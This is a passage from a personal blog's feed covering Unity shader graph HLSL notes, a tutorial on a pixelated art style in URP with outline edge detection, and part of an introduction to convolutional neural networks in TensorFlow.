(usually at right bottom corner) is not the same as the preview in nodes, so when you see errors from your custom node, check the final preview out to see whether your code actually works.</p><p>In case you didnâ€™t notice, the function name in the custom function node should be the same as the name in your HLSL file. For example, if you put the code above to the node, you should type in <code>MainLight</code> in the function name input box. The <code>_float</code> after the function name is describing the precision of your data, itâ€™s either <code>_float</code> or <code>_half</code> in shader graph, and you should also change the precision select box in the graph setting to match your precision in the function.</p><h2 id="Static-Variable"><a href="#Static-Variable" class="headerlink" title="Static Variable"></a>Static Variable</h2><p>When I was coding the outline HLSL file, I declared a float parameter outside the main function without marking it <code>static</code>. In HLSL, if you use the variable out of function without marking it static, then:</p><p><img src="/images/HLSLNote_Static.png"></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/direct3dhlsl/dx-graphics-hlsl-variable-syntax">Official document</a> is good, but sometimes I just donâ€™t know if itâ€™s a feature of the language or a bug.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;A post to record HLSL stuff related to unity shader graph programing.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&lt;small&gt;&amp;lt;The date of this post will be changed once it updates&amp;gt;&lt;/small&gt;&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Unity" scheme="https://kyriota.github.io/categories/Unity/"/>
    
    
  </entry>
  
  <entry>
    <title>Unity Pixelated Art Style In URP</title>
    <link href="https://kyriota.github.io/2022/08/02/Unity_Pixelated_Art_Style_In_URP/"/>
    <id>https://kyriota.github.io/2022/08/02/Unity_Pixelated_Art_Style_In_URP/</id>
    <published>2022-08-02T05:47:00.000Z</published>
    <updated>2022-08-12T15:14:58.838Z</updated>
    
    <content type="html"><![CDATA[<p>Iâ€™m considering diving into game dev for a rather long period from now on, and was managing to find a possible way to build a traditional RPG that can be handled only by myself from any aspect such as assets like models, animation, sound design, and system. I think I should write down my progress and tech details in the future, so that I can feel the speed of my progress and share my experience to help those who are struggling like I was.</p><img height="333" width="515" src="/images/Unity_Pixelated_Art_Style_Final.png" ><span id="more"></span><h1 id="Unity-Pixelated-Art-Style-In-URP"><a href="#Unity-Pixelated-Art-Style-In-URP" class="headerlink" title="Unity Pixelated Art Style In URP"></a>Unity Pixelated Art Style In URP</h1><p>Currently Iâ€™m trying to find a suitable and simple art style for this project to work with, and I saw some pixelated 3D art style created by <a href="https://twitter.com/t3ssel8r">@t3ssel8r</a> by coincidence. Though he didnâ€™t offer any tutorial for beginners to work with, <del>however I am not beginner at all,</del> <small>(Nope)</small> I can still get some information from the comments below his video or twitter especially on how he managed all those amazing works.</p><p><img src="/images/Unity_Pixelated_Art_Style_t3ssel8r.png"></p><center><small>@t3ssel8r's recent work</small></center><p>In order to get a harmonious pixelated art style like t3ssel8râ€™s, I tried to do some breakdown to his final result like the one above.</p><ul><li>Cel shading (also called toon shading, which is more familiar to most developers), a necessity since it can reduce the color range, which is quite important for pixel art in its definition.</li><li>Down sampling, but I find his outcome differ from those pixelated style made by down sampling from camera output, because his method keeps pixel moving smoothly in screen rather than making the whole screen low resolution, so I think he may used some custom render pileline, which is still an unknown area for me to conquer. <strong>This part will not be included in this post</strong>, maybe a relevant post later.</li><li>Outliner, also a significant element in most pixel art. In traditional pixel art, the outline should be seamless, and outline should appear in any sharp edges as if itâ€™s some kind of highlights. So seamless outlines drawn by combining depth, normal, and scene color information is desired.</li></ul><h2 id="Cel-Shading"><a href="#Cel-Shading" class="headerlink" title="Cel Shading"></a>Cel Shading</h2><p>I started to work with cel shading first, and found a developer <a href="https://www.youtube.com/c/RobinSeibold">@Robin Seibold</a> uploaded a cel shader graph with great expansibility in this <a href="https://www.youtube.com/watch?v=gw31oF9qITw">video</a> (BTW his video editing is absolutely fabulous). So I copied one from his video (great thanks to Robin) and modified the shader to suit my own needs (just added more borders to the shadow rather than only one border between lit area and unlit area).</p><p>Iâ€™ve also tried to implement gooch shading, but eventually failed to make it support multiple light sources. So Iâ€™d implement this later and put these content in another post if I succeed.</p><p>To follow the tutorial by Robin, I found my URP version so old that doesnâ€™t include some file that the tutorial may use. Mine is only about URP v10.x.x because thatâ€™s already the highest version Unity 2020 can support according to this <a href="https://github.com/Unity-Technologies/Graphics">official GitHub repo</a>. So I upgraded my Unity to the newest LST 2021.3, which supports URP 12.x.x and dynamic additional light shadows, and made my environment as close to the tutorial as possible.</p><h3 id="Outcome"><a href="#Outcome" class="headerlink" title="Outcome"></a>Outcome</h3><p>For a basic cel material like this one I made below:</p><img height="300" width="300" src="/images/Unity_Pixelated_Art_Style_CelMatPreview.png" ><p>It is coded by following <a href="https://www.youtube.com/c/RobinSeibold">@Robin Seibold</a>â€˜s tutorial I mentioned before, and added a effect that create a certain number of shadow edges, which can be done by just tweaking the diffuse stuff.</p><p>I found a <a href="https://sketchfab.com/3d-models/higokumaru-honkai-impact-3rd-0e903387170846f5939adaa0c277b91b">free model</a> of Honkai Impact 3rd on Sketchfab to test out the cel shading:</p><p><img src="/images/Unity_Pixelated_Art_Style_CelTest.png"></p><p>And I think the effect reaches my desire. This model contains too much details which I can never create in limited time. Currently I just care that whether the shadows, rim, specular looks nice after pixelate, which seems not bad at least.</p><h2 id="Seamless-Outline"><a href="#Seamless-Outline" class="headerlink" title="Seamless Outline"></a>Seamless Outline</h2><p>I used to think outline easy and handy, but this time, it takes me 3 or 4 days to get everything nearly right.</p><img height="200" width="200" src="/images/Unity_Pixelated_Art_Style_Outline.png"><p>Outline is not edge case like â€œPixel Perfect Camâ€, so I found quite a lot sources as references:</p><ul><li><a href="https://www.youtube.com/c/RobinSeibold">@Robin Seibold</a> again, he built a clean outline and taught how to write a renderer feature in URP. Although not using his edge detection method nor using renderer feature to generate normal texture, I learnt a lot about renderer feature by following his video.</li><li><a href="https://www.youtube.com/channel/UCEk8HlMSyA-nkZgFDf5kDEQ">@James King</a>, he tried to recreate <a href="https://twitter.com/t3ssel8r">@t3ssel8r</a>â€˜s outline and pixelated art style in his Three JS project and put it on GitHub.</li></ul><p>This <a href="https://omar-shehata.medium.com/how-to-render-outlines-in-webgl-8253c14724f9">article</a> explained how to draw outline with depth texture and normal texture like the following image does (image from that article)</p><p><img src="/images/Unity_Pixelated_Art_Style_DepthNormalProcess.png"></p><p>To get start with edge detection algorithm, we need the references to a few textures first.</p><h3 id="Depth-Texture"><a href="#Depth-Texture" class="headerlink" title="Depth Texture"></a>Depth Texture</h3><p>Depth texture is much easier to get than normal texture. In order to make URP render a depth texture, check â€œDepth Textureâ€ in URP Assets. After so, the <code>_CameraDepthTexture</code> should be rendered and can be seen through <code>Frame Debugger</code>. In shader graph, <code>Scene Depth</code> node is also provided to access depth conveniently.</p><p><img src="/images/Unity_Pixelated_Art_Style_URPAsset.png"></p><p>To know more about depth in game, make sure to check this <a href="https://www.cyanilux.com/tutorials/depth/">article</a>.</p><p>Itâ€™s noticeable that in orthographic cam, raw depth is already linear01, so you shouldnâ€™t use <code>linear01</code> mode or <code>eye</code> mode in shader graph when using depth node.</p><h3 id="Normal-Texture"><a href="#Normal-Texture" class="headerlink" title="Normal Texture"></a>Normal Texture</h3><p>Thereâ€™re several ways to get a normal texture:</p><ul><li><code>G-Buffer</code> in deferred rendering</li><li><code>_CameraNormalsTexture</code> requested by <code>ConfigureInput(ScriptableRenderPassInput.Normal)</code></li><li>Draw your own normal texture with <code>ScriptableRendererFeature</code> by overriding material on every objects (another version of replacement shader)</li></ul><p>Itâ€™s worth notice that <code>G-Buffer</code> and <code>_CameraNormalsTexture</code> stores <strong>world normal</strong> since those data are usually used to calculate shading / lighting stuff. Drawing your own texture with <code>ScriptableRendererFeature</code> may give you more customizable result, and of course you can draw view normal directly by this method. However, since override material / replacement shader will override your original shaders, vertex displacement resulted by vertex shader will not be applied, nor normal map or any stuff to do with your original material. As screenshot shows below, <code>_CameraNormalsTexture</code> and <code>G-Buffer</code> holds details and vertex modifications which <code>ScriptableRendererFeature</code> doesnâ€™t.</p><p><img src="/images/Unity_Pixelated_Art_Style_NormalMap.png"></p><center><small>L: world normal from G-Buffer<br>R: view normal by override material</small></center><h4 id="G-Buffer"><a href="#G-Buffer" class="headerlink" title="G-Buffer"></a>G-Buffer</h4><p>The easiest one is selecting <code>Rendering Path</code> as <code>Deferred</code> in <code>URP renderer data</code>, and set camera depth texture mode to <code>DepthNormal</code> in script.</p><p><img src="/images/Unity_Pixelated_Art_Style_URPRendererData.png"></p><p>Because deferred rendering generate <code>G-Buffer</code>, which is used to save scene info in GPU to assist shading computations. The normal texture of the scene can be read from it. With URP 12, it is stored in <code>_GBuffer2</code>.</p><p><img src="/images/Unity_Pixelated_Art_Style_GBuffer2.png"></p><p>The normal texture in G-Buffer is world normal, and it stores negative values, which means even though some pixels are pitch black visually, it still stores normal information which can be transformed to view normal by matrix.</p><p><img src="/images/Unity_Pixelated_Art_Style_CameraNormal.png"></p><center><small>L: world normal from G-Buffer<br>R: view normal converted</small></center><h4 id="Scriptable-Render-Pass-Input"><a href="#Scriptable-Render-Pass-Input" class="headerlink" title="Scriptable Render Pass Input"></a>Scriptable Render Pass Input</h4><p>World normal texture can be get not only in deferred rendering, but also in forward rendering if you requested in a renderer feature. Only one line of code can do it: <code>ConfigureInput(ScriptableRenderPassInput.Normal);</code></p><p>After adding this renderer feature to the URP renderer data, <code>_CameraNormalsTexture</code> will be rendered just the same as the normal texture in <code>G-Buffer</code>.</p><h4 id="Override-Material"><a href="#Override-Material" class="headerlink" title="Override Material"></a>Override Material</h4><p>In <code>Built-in</code> pipeline, you can use <code>Replacement Shader</code> to render the whole scene in a single material. But you canâ€™t use it to control the camera in URP since this function is not contained in <code>Camera</code> class, instead you can use override material to achieve same result.</p><p>To do so, a basic understanding to renderer feature work flow is required. Here is a <a href="https://zhuanlan.zhihu.com/p/115080701">Chinese reference</a> about it.</p><p>In a word, you may wanna use a view normal material as override material and render your scene into a render texture you created. Iâ€™m not that familiar with these currently, so just some ambiguous guidance below.</p><ul><li><p>To create a render target:</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">readonly</span> RenderTargetHandle normals;</span><br><span class="line">normals.Init(<span class="string">&quot;_SceneViewSpaceNormals&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>A customized <code>RenderTextureDescriptor</code> can offer options like color format, texture size, etc. It contains all the information required to create a render texture.</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy from cam settings</span></span><br><span class="line">RenderTextureDescriptor normalsTextureDescriptor = cameraTextureDescriptor;</span><br><span class="line"><span class="comment">// Customization</span></span><br><span class="line">normalsTextureDescriptor.colorFormat = RenderTextureFormat.ARGB32;</span><br></pre></td></tr></table></figure></li><li><p>Create a temporary render texture with given parameters, and set it up as a global shader property with nameID. Then redirect render target to the temporary RT, and clear the attachment into the color or depth/stencil values given (depending on the format of this attachment)</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd.GetTemporaryRT(normals.id, normalsTextureDescriptor, FilterMode.Bilinear);</span><br><span class="line">ConfigureTarget(normals.Identifier());</span><br><span class="line">ConfigureClear(ClearFlag.All, Color.black);</span><br></pre></td></tr></table></figure></li><li><p>Create drawing settings and set override material</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DrawingSettings drawSettings = CreateDrawingSettings(shaderTagIdList, <span class="keyword">ref</span> renderingData, renderingData.cameraData.defaultOpaqueSortFlags);</span><br><span class="line">drawSettings.overrideMaterial = normalsMaterial;</span><br><span class="line">FilteringSettings filteringSettings = <span class="keyword">new</span> FilteringSettings(RenderQueueRange.opaque, layerMask);</span><br><span class="line">context.DrawRenderers(renderingData.cullResults, <span class="keyword">ref</span> drawSettings, <span class="keyword">ref</span> filteringSettings);</span><br></pre></td></tr></table></figure></li><li><p>Release temporary RT after usage</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnCameraCleanup</span>(<span class="params">CommandBuffer cmd</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cmd.ReleaseTemporaryRT(normals.id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Opaque-Texture"><a href="#Opaque-Texture" class="headerlink" title="Opaque Texture"></a>Opaque Texture</h3><p><code>_CameraOpaqueTexture</code> provides a snapshot of the scene right before URP renders any transparent meshes. In shader graph, <code>SceneColor</code> node would sample this texture as output.</p><p>By enabling the opaque texture, we can draw outline with reference to the original pixel color. This texture can be also used to create effects like frosted glass, water refraction, or heat waves.</p><p>To enable this texture, check the checkbox under depth texture checkbox in URP asset.</p><h3 id="Edge-Detection"><a href="#Edge-Detection" class="headerlink" title="Edge Detection"></a>Edge Detection</h3><p>After preparations of view normal texture, depth texture, opaque texture, itâ€™s time to do real edge detections with these references.</p><p>Edge detection in game is using basically the same tech in image edge detection. You sample a pixel and its neighbors, comparing their difference. However, since we got both normal and depth textures, itâ€™s possible to achieve more complicated effect by combining them together. <a href="https://www.youtube.com/channel/UCEk8HlMSyA-nkZgFDf5kDEQ">@James King</a> is doing a really nice job on this, and made the outline only one pixel wide, which is a significant factor contributing to the overall appearance of the scene. So Iâ€™d explain his logic and talk about issues I encountered when implementing his method in Unity.</p><h4 id="Depth-Edge"><a href="#Depth-Edge" class="headerlink" title="Depth Edge"></a>Depth Edge</h4><ul><li><p><strong>Preprocess</strong></p><p>  As I said before, raw depth in orthographic cam is already linear01, but the issue is that when far plane and near plane are far away from each other, the difference between two depth value in the texture becomes too tiny to work with. After my experimenting, it would be clear and reasonable when <code>far plane - near plane = 20</code>, so I made a multiplier by referencing far plane and near plane to change my depth scale making it reasonable. </p><p>  Depth values would be difference depending on the platform:</p><ul><li>Direct3D-like, Reversed Z Buffer : <strong>1</strong> at the near plane, <strong>0</strong> at the far plane</li><li>OpenGL-like, Z Buffer : <strong>0</strong> at the near plane, <strong>1</strong> at the far plane</li></ul><p>  This reverse flag is stored in <code>_ProjectionParams.x</code>, it can also be accessed in <code>Camera</code> node in shader graph.</p></li><li><p><strong>Process</strong></p><p>  Now sample a few points around the original pixel, and get the bias by <code>bias = neighbor - center</code>. If using this bias directly, both edges inside the object and outside the object will be drawn, which results in at least 2 pixel wide depth outline. But this can be fixed by clamping bias to [0, 1] or [-1, 0], leaving only one pixel wide outline that either nearer or farther one. After so, use <code>smoothstep</code> to control the visibility of edges with different biases.</p></li></ul><p>Then we are done with it.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pseudo Code</span></span><br><span class="line"><span class="function"><span class="built_in">float</span> <span class="title">GetDepthStrength</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">float</span> difference = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">float</span> bias <span class="keyword">in</span> depthBiases)</span><br><span class="line">        difference += clamp(bias, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> smoothstep(<span class="number">0.01f</span>, <span class="number">0.02f</span>, difference);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Normal-Edge"><a href="#Normal-Edge" class="headerlink" title="Normal Edge"></a>Normal Edge</h4><ul><li><p><strong>Preprocess</strong></p><p>  If you generate view normal texture by overriding materials, you should remap your view normal material from [-1, 1] to [0, 1] since when rendering to the render texture, negative values will be set to 0. By doing so you wonâ€™t lose any normal information. You can remap it back to [-1, 1] when sampling your view normal texture.</p></li><li><p><strong>Edge Sharpness</strong></p><p>  The sharpness is the easiest one to understand in the following parts. <code>sharpness = 1 - dot (normal, neighborNormal)</code></p></li><li><p><strong>Normal Indicator</strong></p><p>Similar to depth edges, weâ€™d like to get normal biases between itâ€™s neighbors: <code>bias = normal - neighborNormal</code>. Since the bias is a <code>float3</code>, it canâ€™t be simply clamped to cut one side of outline (the normal outline is also 2 pixels wide as shown below)</p><img height="200" width="200" src="/images/Unity_Pixelated_Art_Style_RobinOutlineNormal.png"><p>To make the normal outline also one pixel wide, James declared a direction vector3 (e.g. float3(1, 1, 1)) as parameter and get the dot product of which and normal bias: <code>dot(bias, parameter)</code>. Since the normal texture is in view space, such dot product can cull edges on faces in opposite direction of the direction parameter.</p><p><img src="/images/Unity_Pixelated_Art_Style_ViewNormal.png"></p><center><small>View Space Normal</small></center><p>This dot product can then be passed in <code>smoothstep</code> to get control of edge strength and cull the undesired edges. For example, if the direction parameter is <code>float3(1, 1, 1)</code>, then only edges on faces towards up-right and pointing out of screen will be drawn.</p></li><li><p><strong>Depth Indicator</strong></p><p>  Applying one pixel outline though, itâ€™s unsurprised to find that normal edges shows up outside the object, and it also draws outlines on concave edges.</p><p>  <img src="/images/Unity_Pixelated_Art_Style_DepthIndicator.png"></p>  <center><small>Even two cubes have no contact<br>The normal texture indeed has difference there<br>And happen to match the requirement of the direction parameter</small></center><p>  <img src="/images/Unity_Pixelated_Art_Style_ConcaveEdge.png"></p>  <center><small>The concave edges in red box are not desired in most pixel art</small></center>    To eliminate these outlines, we can make only the shallower pixel detects the normal edge. So depth bias is required here to calculate the depth indicator. Get the average depth bias of the original pixel, if the value is negative, it means the pixel is farther than its neighbors, which should be culled when detecting normal edges; otherwise it counts.</li></ul><p>So the final normal edge strength can be represented as follows:</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pseudo Code</span></span><br><span class="line"><span class="function"><span class="built_in">float</span> <span class="title">GetNormalStrength</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">float</span> normalIndicator = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (float3 neighborNormal <span class="keyword">in</span> neighborNormals)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> sharpness = (<span class="number">1</span> - dot(normal, neighborNormal));</span><br><span class="line">        <span class="built_in">float</span> normalIndicator = smoothstep(<span class="number">-0.01f</span>, <span class="number">0.01f</span>, dot(normalBias, directionPara));</span><br><span class="line">        normalIndicator += sharpness * normalIndicator;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">float</span> avgDepthBias = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">float</span> bias <span class="keyword">in</span> depthBiases)</span><br><span class="line">        avgDepthBias += bias;</span><br><span class="line">    avgDepthBias /= neighborPointCount;</span><br><span class="line">    <span class="keyword">return</span> step(<span class="number">0.1f</span>, normalIndicator * clamp(sign(avgDepthBias), <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Outcome-1"><a href="#Outcome-1" class="headerlink" title="Outcome"></a>Outcome</h4><p>Two parameters to control depth and normal edge strength may be wanted. Usually, our brain would like the outline of an object darker, and the normal edges brighter:</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">float</span> strength =</span><br><span class="line">    depthEdgeStrength &gt; <span class="number">0</span> ?</span><br><span class="line">    (<span class="number">1</span> - _depthStrengthPara * depthEdgeStrength) :</span><br><span class="line">    (<span class="number">1</span> + _normalStrengthPara * normalEdgeStrength);</span><br><span class="line">_color = float3(<span class="number">.5</span>f, <span class="number">.5</span>f, <span class="number">.5</span>f) * strength;</span><br></pre></td></tr></table></figure><p><img src="/images/Unity_Pixelated_Art_Style_FinalOutline.png"></p><p>To add scene color to the outline, I analysed the pros and cons of <code>_color = _texel * strength</code> and <code>_color = pow(_texel, strength)</code>, and found the method below is my favorite.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_color =</span><br><span class="line">    dei &gt; <span class="number">0</span> ?</span><br><span class="line">    _texel * (<span class="number">1</span> - _depthStrength * dei) :</span><br><span class="line">    pow(_texel, <span class="number">1</span> - _normalStrength * nei);</span><br></pre></td></tr></table></figure><p><img src="/images/Unity_Pixelated_Art_Style_Final.gif"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;Iâ€™m considering diving into game dev for a rather long period from now on, and was managing to find a possible way to build a traditional RPG that can be handled only by myself from any aspect such as assets like models, animation, sound design, and system. I think I should write down my progress and tech details in the future, so that I can feel the speed of my progress and share my experience to help those who are struggling like I was.&lt;/p&gt;
&lt;img height=&quot;333&quot; width=&quot;515&quot; src=&quot;/images/Unity_Pixelated_Art_Style_Final.png&quot; &gt;</summary>
    
    
    
    <category term="Unity" scheme="https://kyriota.github.io/categories/Unity/"/>
    
    
  </entry>
  
  <entry>
    <title>Convolutional Neural Network</title>
    <link href="https://kyriota.github.io/2022/06/27/Convolutional%20Neural%20Network/"/>
    <id>https://kyriota.github.io/2022/06/27/Convolutional%20Neural%20Network/</id>
    <published>2022-06-27T06:06:00.000Z</published>
    <updated>2022-08-12T15:20:52.670Z</updated>
    
    <content type="html"><![CDATA[<p>I roughly learnt CNN recently and was about to code one just like the FCNN I coded before. However this may be too costly to time, so Iâ€™ll use TensorFlow in this case and learn more about TF conveniently.</p><span id="more"></span><!--toc--><h1 id="Convolutional-Neural-Network"><a href="#Convolutional-Neural-Network" class="headerlink" title="Convolutional Neural Network"></a>Convolutional Neural Network</h1><p>(This is my first English blog, and maybe there would be more blogs in EN in the future if Iâ€™d like to practice my writing in English. My English sucks, so feel free to raise issues if any error is found)</p><h2 id="CNN-Introduction"><a href="#CNN-Introduction" class="headerlink" title="CNN Introduction"></a>CNN Introduction</h2><p>Actually the core feature of convolutional neural network is the convolutional layer and maybe pooling layer. But since pooling layer is usually treated as a part of convolutional layer in that it does linear calculations.</p><p>A convolutional layer can be concluded as following image, which I drew  by my own.</p><p><img src="/images/CNN_summary.png"></p><h3 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h3><p>A convolutional layer has two parameter matrices we need to train which are <code>Filter</code> and <code>Bias</code>. Being different from FC layer, in a convolutional layer, <code>Bias</code> matrix cannot be blended into <code>Filter</code> matrix due to the cross correlation operation.</p><p>Comparing with FC layers, the biggest change in convolutional layers is that convolutional layers donâ€™t mind tensors as inputs, keeping the form of tensor from the beginning to the end. On the contrary, we would usually reshape the input to a vector at first in FCNN.</p><p>Mathematically, we can treat a FC layer as a particular case of convolutional layer, and the convolutional layer is the generalization of the FC layer. To prove this, just making all matrices in convolutional layer one dimension. The following image can explain the conclusion further.</p><p><img src="/images/CNN_CNN2FCNN.png"></p><h3 id="Working-Flow"><a href="#Working-Flow" class="headerlink" title="Working Flow"></a>Working Flow</h3><p>A convolutional layer feeds its input to convolutional kernels. The kernels will do cross correlation operation and add the bias accordingly. At the end, collect all outputs from all kernels and make it a new tensor by just stacking those outputs. The output of a convolutional layer is called feature map.</p><h3 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h3><p>A convolutional layer has a rather different goal from the FC layer.</p><p>When using FC layers, we are expecting a humanoid brain neuron like model can learn from generic inputs. However, when doing image processing, this particular topic leads to huge amount of trainable parameters in FCNN. In which case, we can do some pre-process to the input image since we can easily see that not every pixel in the input is important for the task, and this pre-process is called convolution. From this aspect, we can treat convolutional layers in the network as feature detectors, the convolutional layers learn to extract meaningful features from the image using the filter and bias tensor, and use pooling layers to compress / emphasis the feature it extracted, making fewer trainable parameters.</p><p>But as I mentioned, convolutional layers are only good at feature extraction. So when doing classification with multiple features, itâ€™s still better to use FC layers. In which case, a CNN usually end up with FC layers to give the final outputs.</p><p>In conclusion, in CNN, the goal of a convolutional layer is extracting features from a rather huge input. The goal of a pooling layer is compressing data without damaging the main features. The goal of a FC layer in the end of CNN is to learn classification by giving features just as normal AI things would do.</p><h3 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h3><p>We can apply CNN in not only image recognition but also other area that shares the basic features with image recognition. For example, go and mahjong playing used CNN a lot. Especially in go playing, we can treat the go board as a 19x19 image with 48 channels (the reason why there should be 48 channels was raised by pros). and we can process every local part separately to get features of current situation. However, pooling layers are NOT used in go AI since the data loss in pooling operation is deadly to describe a go game. So design your CNN structure thoughtfully before putting it into training.</p><h3 id="Back-Prop"><a href="#Back-Prop" class="headerlink" title="Back Prop"></a>Back Prop</h3><p>I used to be quite curios about the back propagation in convolutional layer, and pooling layers also made me confused. But actually they are basically the same as back prop in FCNN if you expand all formulas.</p><p>This <a href="https://www.youtube.com/watch?v=Lakz2MoHy6o&t=1097s">Video</a> explained how back prop in convolutional layer works.</p><p><img src="/images/CNN_BackProp.png"></p><p>As for max pooling, since itâ€™s just doing linear calculation, when doing back prop, just implement the gradient to the max <code>A</code> of the previous one if there is a max pooling layer between them, and othersâ€™ gradients are 0.</p><h2 id="CNN-Example"><a href="#CNN-Example" class="headerlink" title="CNN Example"></a>CNN Example</h2><p>Following this <a href="https://www.youtube.com/watch?v=eMMZpas-zX0">video</a>, I coded a simple CNN example with <code>TensorFlow</code> to classify <code>CIFAR10</code>, a dataset with 10 classes as following.</p><blockquote><p>â€˜airplaneâ€™, â€˜automobileâ€™, â€˜birdâ€™, â€˜catâ€™, â€˜deerâ€™, â€˜dogâ€™, â€˜frogâ€™, â€˜horseâ€™, â€˜shipâ€™, â€˜truckâ€™</p></blockquote><p>However, in my opinion, some images are too blur to classify even for human, so itâ€™s not surprised that AI performs poorly.</p><p><img src="/images/CNN_dataset.jpg"></p><p>Though thereâ€™s somebody made accuracy 90%+ AI with <code>ResNet</code>, that should be the content of another blog then. I made it 86.0% in 40 epochs, which is enough for experimenting CNN.</p><h3 id="Structure-1"><a href="#Structure-1" class="headerlink" title="Structure"></a>Structure</h3><p>Referring <code>LeNet</code>, <code>VGG</code>, and so on, we can see that the width and length of the tensor tend to go down, whereas the number of channels does increase as we go deeper into the layers of the network. Another pattern that still often repeated today is that we might have some one or more conv layers followed by a pooling layer.</p><p><img src="/images/CNN_LeNet.png"></p><center><small>LeNet</small></center><p>So I came up with this structure:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Model: &quot;sequential&quot;</span><br><span class="line">_________________________________________________________________</span><br><span class="line"> Layer (type)                Output Shape              Param #   </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> conv2d (Conv2D)             (None, 32, 32, 64)        1792      </span><br><span class="line">                                                                 </span><br><span class="line"> max_pooling2d (MaxPooling2D  (None, 16, 16, 64)       0         </span><br><span class="line"> )                                                               </span><br><span class="line">                                                                 </span><br><span class="line"> conv2d_1 (Conv2D)           (None, 16, 16, 128)       73856     </span><br><span class="line">                                                                 </span><br><span class="line"> max_pooling2d_1 (MaxPooling  (None, 8, 8, 128)        0         </span><br><span class="line"> 2D)                                                             </span><br><span class="line">                                                                 </span><br><span class="line"> conv2d_2 (Conv2D)           (None, 8, 8, 256)         295168    </span><br><span 